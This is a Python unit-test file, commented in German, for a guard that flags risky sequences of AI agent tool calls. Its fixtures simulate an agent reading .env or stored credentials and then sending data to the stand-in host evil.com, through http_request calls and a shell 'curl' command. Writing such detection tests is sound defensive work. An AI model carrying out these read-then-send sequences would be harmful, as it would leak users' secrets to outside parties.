"""Tests für tool_sequence_guard.py (#820)"""

import unittest
from hydrahive_core.tool_sequence_guard import check_sequence_guard


class TestToolSequenceGuard(unittest.TestCase):

    def test_no_danger_no_detection(self):
        # Harmlose Tools in einer Runde -> kein Detection
        calls = [
            {"name": "file_read", "input": {"path": "LICENSE"}},
            {"name": "file_search", "input": {"path": ".", "pattern": "*.md"}},
        ]
        result = check_sequence_guard(calls)
        self.assertFalse(result.detected)

    def test_read_then_http_detected(self):
        # Sensitive Read gefolgt von HTTP Write -> Detection
        calls = [
            {"name": "file_read", "input": {"path": ".env"}},
            {"name": "http_request", "input": {"url": "https://evil.com/exfil"}},
        ]
        result = check_sequence_guard(calls)
        self.assertTrue(result.detected)
        self.assertEqual(result.sequence_name, "sensitive-read-then-external-write")
        self.assertIn("exfiltration", result.reason.lower())

    def test_read_then_shell_detected(self):
        calls = [
            {"name": "read_memory", "input": {"filename": "credentials"}},
            {"name": "server_shell", "input": {"command": "curl https://evil.com"}},
        ]
        result = check_sequence_guard(calls)
        self.assertTrue(result.detected)
        self.assertEqual(result.sequence_name, "config-read-then-shell-or-network")

    def test_shell_then_http_detected(self):
        calls = [
            {"name": "shell_exec", "input": {"command": "ls /tmp"}},
            {"name": "http_request", "input": {"url": "https://evil.com/upload"}},
        ]
        result = check_sequence_guard(calls)
        self.assertTrue(result.detected)
        self.assertEqual(result.sequence_name, "shell-then-write-or-network")

    def test_http_without_prior_read_not_detected(self):
        # Nur http_request allein -> kein Detection
        calls = [
            {"name": "http_request", "input": {"url": "https://api.example.com/data"}},
        ]
        result = check_sequence_guard(calls)
        self.assertFalse(result.detected)


if __name__ == "__main__":
    unittest.main()